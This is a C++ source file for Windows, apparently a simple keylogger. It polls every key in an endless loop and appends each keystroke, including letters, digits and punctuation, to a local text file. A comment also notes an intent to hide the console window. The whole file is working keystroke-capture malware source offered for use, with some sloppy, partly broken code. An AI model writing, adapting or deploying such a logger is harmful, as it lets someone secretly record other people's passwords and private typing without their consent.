#include<windows.h> //for hide cmd
#include<cstdlib> //for use system function
#include<iostream>
#include<conio.h>
#include<fstream>
using namespace std;

int keylog(int i,char *text);
int keylog1(); // ~
int keylog2(); // '
int keylog3(); // ]
int keylog4(); // [
int keylog5(); // - 
int keylog6(); // =
int keylog7(); // ;
int keylog8(); // "\"
int keylog9(); // /
int keylog10(); //  .
int keylog11(); // ,
int extra();
bool OEM_3 = false; // ~
bool OEM_6 = false; //]
bool OEM_4 = false; //[
bool OEM_MINUS =false; // -
bool OEM_1 = false; //;
bool OEM_5 = false; // "\"
bool OEM_2 = false; // /
bool OEM_PERIOD = false; //.
bool OEM_COMMA = false; //,
bool OEM_PLUS = false; //=
bool OEM_7 = false; // "

int main(){
	//system("runmybat.bat");
    while(true){               //for infinite loop
         for(char i=0;i<=255;i++){
            if(GetAsyncKeyState(i) == -32767){
            	keylog(i,"key.txt");
			}
			extra(); 
			
    }
    
}
    return 0;
	
}

int keylog(int out, char *text){
  ofstream fout("abc.txt",ios::app); // (ios::app)---> All output operations are performed at the end of the file, appending the content to the current content of the file.
   cout<<out<<endl;
   if (out==9)
    fout<<"[Tab]";
   else if (out==32)
    fout<<' ';
    else if(out ==8)
     fout<<"[Blackspace]";
   else if (out==13)
    fout<<'\n';
   else if (out==16)
    fout<<"[Shift]";
   else if (out>=48&&out<=59)
    fout<<out-48;
   else if (out>=65&&out<=90)
    fout<<char(tolower(out));
   else if (out==96) fout<<"0";
   else if (out==97) fout<<"1";
	else if (out==98) fout<<"2" ;
    else if (out==99) fout<<"3" ;
    else if (out==100) fout<<"4" ;
    else if (out==101) fout<<"5" ;
    else if (out==102) fout<<"6" ;
    else if (out==103) fout<<"7" ;
    else if (out==104) fout<<"8" ;
    else if (out==105) fout<<"9";
    else if (out==106) fout<<"*" ;
	else if (out==107) fout<<"+" ;
	else if (out==109) fout<<"-";
	else if (out==111) fout<<"/" ; 
	else if (out==110) fout<<"."; 	    
    fout.close();
}

int keylog1(){
	ofstream fout("abc.txt",ios::app);
	fout<<"[~]";
	fout.close();
}

int keylog2(){ //VK_OEM_7
	ofstream fout("abc.txt",ios::app);
	fout<<"'";
	fout.close();
}

int keylog3(){ //VK_OEM_6
	ofstream fout("abc.txt",ios::app);
	fout<<"]";
	fout.close();
}

int keylog4(){ //VK_OEM_4
	ofstream fout("abc.txt",ios::app);
	fout<<"[";
	fout.close();
}

int keylog5(){ //VK_OEM_MINUS
	ofstream fout("abc.txt",ios::app);
	fout<<"-";
	fout.close();
}

int keylog6(){ //VK_OEM_PLUS
	ofstream fout("abc.txt",ios::app);
	fout<<"=";
	fout.close();
}

int keylog7(){ //VK_OEM_1
	ofstream fout("abc.txt",ios::app);
	fout<<";";
	fout.close();
}

int keylog8(){ //VK_OEM_5
	ofstream fout("abc.txt",ios::app);
	fout<<"\\";
	fout.close();
}

int keylog9(){ //VK_OEM_2
	ofstream fout("abc.txt",ios::app);
	fout<<"/";
	fout.close();
}

int keylog10(){ //VK_OEM_PERIOD
	ofstream fout("abc.txt",ios::app);
	fout<<".";
	fout.close();
} 

int keylog11(){ //VK_EOM_COMMA
	ofstream fout("abc.txt",ios::app);
	fout<<",";
	fout.close();
}



int extra(){
	
	  if (GetAsyncKeyState(VK_OEM_3) < 0 && OEM_3 == false)
    {
      //Press do0wn
      OEM_3 = true;
      keylog1();
      cout << "[Change Language]" << endl;
      
    }
    	if (GetAsyncKeyState(VK_OEM_3) >= 0 && OEM_3 == true){
      //Release
      OEM_3 = false;

    	}
	//////////////////////////////////////////////////////////
	
		  if (GetAsyncKeyState(VK_OEM_6) < 0 && OEM_6 == false)
    {
      //Press do0wn
      OEM_6 = true;
      keylog3();
      cout << "]" << endl;
      
    }
    	if (GetAsyncKeyState(VK_OEM_6) >= 0 && OEM_6 == true){
      //Release
      OEM_6 = false;

    	}
	//////////////////////////////////////////////////////////	 
		  
		  if (GetAsyncKeyState(VK_OEM_4) < 0 && OEM_4 == false)
    {
      //Press do0wn
      OEM_4 = true;
      keylog4();
      cout << "[" << endl;
      
    }
    	if (GetAsyncKeyState(VK_OEM_4) >= 0 && OEM_4 == true){
      //Release
      OEM_4 = false;
      
    	}
	//////////////////////////////////////////////////////////
		
		  if (GetAsyncKeyState(VK_OEM_1) < 0 && OEM_1 == false)
    {
      //Press do0wn
      OEM_1 = true;
      keylog7();
      cout << ";" << endl;
      
    }
    	if (GetAsyncKeyState(VK_OEM_1) >= 0 && OEM_1 == true){
      //Release
      OEM_1 = false;
      
    	}
	//////////////////////////////////////////////////////////
		
		  if (GetAsyncKeyState(VK_OEM_5) < 0 && OEM_5 == false)
    {
      //Press down
      OEM_5 = true;
      keylog8();
      cout << "\\" << endl;
      
    }
    	if (GetAsyncKeyState(VK_OEM_5) >= 0 && OEM_5 == true){
      //Release
      OEM_5 = false;

    	}
	//////////////////////////////////////////////////////////
		
		  if (GetAsyncKeyState(VK_OEM_2) < 0 && OEM_2 == false)
    {
      //Press down
      OEM_2 = true;
      keylog9();
      cout << "/" << endl;
      
    }
    	if (GetAsyncKeyState(VK_OEM_2) >= 0 && OEM_2 == true){
      //Release
      OEM_2 = false;

    	}
	//////////////////////////////////////////////////////////
		
		  if (GetAsyncKeyState(VK_OEM_MINUS) < 0 && OEM_MINUS == false)
    {
      //Press do0wn
      OEM_MINUS = true;
      keylog5();
      cout << "-" << endl;
      
    }
    	if (GetAsyncKeyState(VK_OEM_MINUS) >= 0 && OEM_MINUS == true){
      //Release
      OEM_MINUS = false;
      
    	}
	//////////////////////////////////////////////////////////
		
		  if (GetAsyncKeyState(VK_OEM_PERIOD) < 0 && OEM_PERIOD == false)
    {
      //Press do0wn
      OEM_PERIOD = true;
      keylog10();
      cout << "." << endl;
      
    }
    	if (GetAsyncKeyState(VK_OEM_PERIOD) >= 0 && OEM_PERIOD == true){
      //Release
      OEM_PERIOD = false;
      
    	}
	//////////////////////////////////////////////////////////
		
		  if (GetAsyncKeyState(VK_OEM_COMMA) < 0 && OEM_COMMA == false)
    {
      //Press do0wn
      OEM_COMMA = true;
      keylog11();
      cout << "," << endl;
      
    }
    	if (GetAsyncKeyState(VK_OEM_COMMA) >= 0 && OEM_COMMA == true){
      //Release
      OEM_COMMA = false;
      
    	}  
	///////////////////////////////////////////////////////
		
		if (GetAsyncKeyState(VK_OEM_PLUS) < 0 && OEM_PLUS == false)
    {
      //Press do0wn
      OEM_PLUS = true;
      keylog6();
      cout << "=" << endl;
      
    }
    	if (GetAsyncKeyState(VK_OEM_PLUS) >= 0 && OEM_PLUS == true){
      //Release
      OEM_PLUS = false;
      
    	}
    /////////////////////////////////////////////////////////
    
    
    	if (GetAsyncKeyState(VK_OEM_7) < 0 && OEM_7 == false)
    {
      //Press do0wn
      OEM_7 = true;
      keylog2();
      cout << "'" << endl;
      
    }
    	if (GetAsyncKeyState(VK_OEM_7) >= 0 && OEM_7 == true){
      //Release
      OEM_7 = false;
      
    	}
    /////////////////////////////////////////////////////////
}
